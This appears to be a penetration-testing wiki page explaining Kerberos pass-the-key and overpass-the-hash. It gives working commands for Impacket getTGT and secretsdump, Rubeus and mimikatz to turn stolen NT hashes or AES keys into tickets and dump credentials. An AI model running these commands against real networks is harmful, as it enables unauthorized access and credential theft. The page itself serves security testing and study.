## Theory
The pre-authentication requires the requesting user to supply its secret key (DES, RC4, AES128 or AES256) derived from the user password. An attacker knowing that secret key doesn't need knowledge of the actual password to obtain tickets. This is called pass-the-key.

Kerberos offers 4 different key types: DES, RC4, AES-128 and AES-256.

- When the RC4 etype is enabled, the RC4 key can be used. The problem is that the RC4 key is in fact the user's NT hash. Using a an NT hash to obtain Kerberos tickets is called overpass the hash.
- When RC4 is disabled, other Kerberos keys (DES, AES-128, AES-256) can be passed as well. This technique is called pass the key. In fact, only the name and key used differ between overpass the hash and pass the key, the technique is the same.
## Exploit
=== "UNIX-like"
    The Impacket script getTGT (Python) can request a TGT (Ticket Granting Ticket) given a password, hash (LMhash can be empty), or aesKey. The TGT will be saved as a .ccache file that can then be used by other Impacket scripts.
    ```bash
    # with an NT hash (overpass-the-hash)
    getTGT.py -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET

    # with an AES (128 or 256 bits) key (pass-the-key)
    getTGT.py -aesKey 'KerberosKey' $DOMAIN/$USER@$TARGET
    ```
    Once a TGT is obtained, the tester can use it with the environment variable `KRB5CCNAME` with tools implementing pass-the-ticket.
    ```bash
    export KRB5CCNAME=/path/to/ticket
    ```
    An alternative to requesting the TGT and then passing the ticket is using the `-k` option in Impacket scripts. Using that option allows for passing either TGTs or STs. Example below with `secretsdump`.
    ```bash
    secretsdump.py -k -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET
    ```
=== "Windows"
    On Windows, requesting a TGT can be achieved with Rubeus (C#). The ticket will be injected in the session and Windows will natively be able to use these tickets to access given services.
    ```bash
    # with an NT hash
    Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /rc4:$NThash /ptt

    # with an AES 128 key
    Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes128:$aes128_key /ptt

    # with an AES 256 key
    Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:$aes256_key /ptt
    ```
    An alternative to Rubeus is mimikatz with `sekurlsa::pth`.
    ```bash
    # with an NT hash
    sekurlsa::pth /user:$USER /domain:$DOMAIN /rc4:$NThash /ptt

    # with an AES 128 key
    sekurlsa::pth /user:$USER /domain:$DOMAIN /aes128:$aes128_key /ptt

    # with an AES 256 key
    sekurlsa::pth /user:$USER /domain:$DOMAIN /aes256:$aes256_key /ptt
    ```